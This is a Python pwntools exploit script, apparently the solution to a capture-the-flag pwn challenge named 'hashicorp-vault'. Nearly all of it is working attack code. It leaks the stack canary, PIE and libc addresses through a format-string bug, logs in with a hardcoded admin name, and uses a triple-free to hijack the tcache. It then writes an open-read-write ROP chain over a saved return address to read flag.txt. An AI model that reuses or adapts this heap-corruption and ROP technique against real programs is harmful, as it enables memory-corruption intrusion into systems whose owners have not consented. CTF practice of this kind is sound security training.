#!/usr/bin/env python3

import re
from pwn import *

exe = ELF("./dist/hashicorp-vault", checksec=False)
context.binary = exe

def conn():
    if args.LOCAL:
        return process(["./dist/hashicorp-vault"])
    else:
        return remote("127.0.0.1", 1112)

def main():
    r = conn()

    def rent(idx, size):
        r.sendlineafter(b"> ", b"1")
        r.sendlineafter(b"Vault index (0-9): ", str(idx).encode())
        r.sendlineafter(b"Size: ", str(size).encode())

    def store(idx, data):
        r.sendlineafter(b"> ", b"2")
        r.sendlineafter(b"Vault index: ", str(idx).encode())
        r.sendafter(b"Data: ", data)

    def ret_vault(idx):
        r.sendlineafter(b"> ", b"4")
        r.sendlineafter(b"Vault index: ", str(idx).encode())

    def alias(src, dst):
        r.sendlineafter(b"> ", b"5")
        r.sendlineafter(b"Source vault (0-9): ", str(src).encode())
        r.sendlineafter(b"Alias vault (0-9): ", str(dst).encode())

    def tf(a, b, c, size):
        rent(a, size)
        alias(a, b)
        alias(a, c)
        ret_vault(a)
        store(b, p64(0) + p64(0))
        ret_vault(b)
        store(c, p64(0) + p64(0))
        ret_vault(c)

    log.info("[1] Leak Canary, PIE, RBP, and Libc...")
    r.sendafter(b"Username: ", b"%13$p.%14$p.%19$p.%23$p.\n\x00")
    r.recvuntil(b"user: ")
    raw = r.recvline().strip()
    leaks = [int(x, 16) if x != b'(nil)' else 0 for x in raw.split(b".") if x]
    canary, rbp_main, libc_leak, pie_leak = leaks

    exe.address = pie_leak - 0xf81
    store_item_ret = rbp_main - 0x18

    log.success(f"Canary:         {hex(canary)}")
    log.success(f"PIE base:       {hex(exe.address)}")
    log.success(f"RBP main:       {hex(rbp_main)}")
    log.success(f"store_item_ret: {hex(store_item_ret)}")
    log.success(f"LEAKED libc:    {hex(libc_leak)}")

    # At this step, the player will copy the leaked address to https://libc.rip/
    # Leaked __libc_start_main_ret ends with 0x083 -> matches libc6_2.31-0ubuntu9.*_amd64
    LIBC_OFFSET_START_MAIN = 0x24083
    LIBC_OFFSET_OPEN       = 0x10df00
    LIBC_OFFSET_READ       = 0x10e1e0
    LIBC_OFFSET_WRITE      = 0x10e280
    LIBC_OFFSET_EXIT       = 0x46a40
    LIBC_OFFSET_BSS        = 0x1ed7a0

    POP_RDI                = 0x23b6a
    POP_RSI                = 0x2601f
    POP_RDX_R12            = 0x119431
    RET                    = 0x22679

    libc_base = libc_leak - LIBC_OFFSET_START_MAIN
    log.success(f"Libc base:      {hex(libc_base)}")

    log.info("[2] Login...")
    r.sendafter(b"Username: ", b"S3cr3t_M4st3r_4dm1n\n\x00")
    r.recvuntil(b"Welcome back, Admin!")

    size = 0x100
    log.info(f"[3] Triple-free...")
    tf(0, 1, 2, size)

    rent(3, size)
    store(3, p64(store_item_ret))
    rent(4, size)
    rent(9, size)

    log.info("[4] Construct ORW ROP chain...")
    flag_buf = libc_base + LIBC_OFFSET_BSS + 0x100

    rop_payload = [
        libc_base + RET,

        libc_base + POP_RSI,
        0,
        libc_base + POP_RDI,
        0,
        libc_base + LIBC_OFFSET_OPEN,

        libc_base + POP_RDX_R12,
        0x100,
        0,
        libc_base + POP_RSI,
        flag_buf,
        libc_base + POP_RDI,
        3,
        libc_base + LIBC_OFFSET_READ,

        libc_base + POP_RDX_R12,
        0x100,
        0,
        libc_base + POP_RSI,
        flag_buf,
        libc_base + POP_RDI,
        1,
        libc_base + LIBC_OFFSET_WRITE,

        libc_base + POP_RDI,
        0,
        libc_base + LIBC_OFFSET_EXIT
    ]

    flag_str_stack = store_item_ret + len(rop_payload) * 8
    rop_payload[4] = flag_str_stack

    payload = b"".join(p64(x) for x in rop_payload) + b"flag.txt\x00"
    log.info(f"Payload size: {len(payload)} bytes (capacity: {size} bytes)")
    assert len(payload) <= size, "Payload too large!"

    log.info("[5] Store payload...")
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"Vault index: ", b"9")
    r.sendafter(b"Data: ", payload)

    res = r.recvall(timeout=5)
    flag_match = re.search(rb"(UIT\{[^}]+\}|FLAG\{[^}]+\}|flag\{[^}]+\}|CTF\{[^}]+\})", res)
    if flag_match:
        flag = flag_match.group(1).decode()
        print(f"FLAG: {flag}")
    else:
        log.warning(f"Raw output:\n{res.decode(errors='replace')}")

    r.close()

if __name__ == "__main__":
    main()
